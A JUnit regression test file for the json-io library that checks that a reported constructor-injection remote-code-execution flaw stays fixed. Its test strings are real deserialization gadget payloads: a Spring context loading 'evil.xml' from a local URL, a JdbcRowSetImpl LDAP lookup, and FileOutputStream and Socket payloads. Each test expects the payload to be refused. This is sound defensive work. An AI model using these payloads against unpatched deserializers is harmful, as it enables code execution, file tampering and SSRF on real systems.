package com.cedarsoftware.io;

import java.io.File;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * End-to-end regression coverage for the constructor-injection RCE reported against json-io 4.108.0,
 * driven through the exact public entry point the report used: {@code JsonIo.toJava(json, null)} with
 * default {@link ReadOptions} ({@code ReturnType.JAVA_OBJECTS}).
 * <p>
 * The vulnerability was that json-io trusts the {@code @type} field to choose a class and hands the
 * sibling JSON fields to that class's constructor. It performs no security checks of its own — every
 * instantiation is delegated to {@code ClassUtilities.newInstance} — so the fix lives in java-util
 * (4.109.0), and these tests exist to prove the fix holds at json-io's boundary and to catch any
 * future regression that reopens the path.
 * <p>
 * The report's suggested remedy of defaulting to {@code returnAsNativeJsonObjects()} was deliberately
 * <b>not</b> adopted: it would break every existing caller that relies on POJO hydration, and the
 * java-util fix closes the hole without a behavioral change. Callers who want the read-only object
 * model can still opt into it, and that guidance is documented in SECURITY.md.
 */
class ConstructorInjectionSecurityTest {

    @AfterEach
    void tearDown() {
        ClassPathXmlApplicationContext.refreshed = null;
    }

    /**
     * The reported payload verbatim. Note the plural {@code configLocations}: it name-matches the
     * varargs {@code String...} constructor, which in the real class calls {@code refresh()} and
     * loads the attacker's bean XML. Pre-fix this constructor ran, because java-util's
     * named-parameter path never consulted its own denylist.
     * <p>
     * Refused at the <b>instantiation</b> layer ("access to this class is not allowed"): the concrete
     * name is not itself listed, so the block lands through the
     * {@code org.springframework.context.ApplicationContext} supertype.
     */
    @Test
    void springApplicationContextPayloadIsRefused() {
        String payload = "{\"@type\":\"org.springframework.context.support.ClassPathXmlApplicationContext\","
                + "\"configLocations\":\"http://127.0.0.1:8000/evil.xml\"}";

        assertThatThrownBy(() -> JsonIo.toJava(payload, null).asClass(Object.class))
                .as("must not instantiate an indirect loader named in untrusted input")
                .rootCause()
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("access to this class is not allowed")
                .hasMessageContaining("ClassPathXmlApplicationContext");

        assertThat(ClassPathXmlApplicationContext.refreshed)
                .as("constructor side effect (refresh(), which fetches the attacker URL) must never run")
                .isNull();
    }

    /**
     * {@code FileOutputStream}'s constructor creates or truncates whatever path it is handed — an
     * integrity/DoS primitive needing no gadget library at all, only {@code java.base}.
     * <p>
     * Refused one layer earlier than the Spring payload, at <b>class resolution</b> ("cannot load"):
     * the name is listed outright, so {@code @type} never resolves to a Class at all.
     */
    @Test
    void fileOutputStreamPayloadCreatesNoFile() {
        File victim = new File(System.getProperty("java.io.tmpdir"), "json-io-cve-must-not-exist.txt");
        victim.delete();

        String payload = "{\"@type\":\"java.io.FileOutputStream\",\"name\":\""
                + victim.getAbsolutePath().replace("\\", "\\\\") + "\"}";

        assertThatThrownBy(() -> JsonIo.toJava(payload, null).asClass(Object.class))
                .rootCause()
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("cannot load")
                .hasMessageContaining("FileOutputStream");

        assertThat(victim).as("attacker-named file must not have been created or truncated").doesNotExist();
    }

    /** {@code Socket}'s constructor connects, giving SSRF / port-scanning from the victim process. */
    @Test
    void socketPayloadOpensNoConnection() {
        String payload = "{\"@type\":\"java.net.Socket\",\"host\":\"127.0.0.1\",\"port\":9}";

        assertThatThrownBy(() -> JsonIo.toJava(payload, null).asClass(Object.class))
                .rootCause()
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("Socket");
    }

    /** The other off-list families closed in java-util 4.109.0, exercised through json-io's parser. */
    @Test
    void otherIndirectLoaderPayloadsAreRefused() {
        String[] payloads = {
                "{\"@type\":\"javax.naming.InitialContext\"}",
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1/x\"}",
                "{\"@type\":\"java.io.ObjectInputStream\"}",
                "{\"@type\":\"java.io.RandomAccessFile\",\"name\":\"x\",\"mode\":\"rw\"}",
                "{\"@type\":\"java.net.ServerSocket\",\"port\":0}",
        };

        for (String payload : payloads) {
            assertThatThrownBy(() -> JsonIo.toJava(payload, null).asClass(Object.class))
                    .as("payload must be refused: %s", payload)
                    .rootCause()
                    .isInstanceOf(SecurityException.class);
        }
    }

    /** Ordinary POJO hydration must be untouched — the default ReturnType is deliberately unchanged. */
    @Test
    void ordinaryPojoHydrationStillWorks() {
        String json = "{\"@type\":\"" + Order.class.getName() + "\",\"id\":42,\"item\":\"widget\"}";

        Object result = JsonIo.toJava(json, null).asClass(Object.class);

        assertThat(result).isInstanceOf(Order.class);
        Order order = (Order) result;
        assertThat(order.id).isEqualTo(42);
        assertThat(order.item).isEqualTo("widget");
    }

    public static class Order {
        public int id;
        public String item;
    }
}
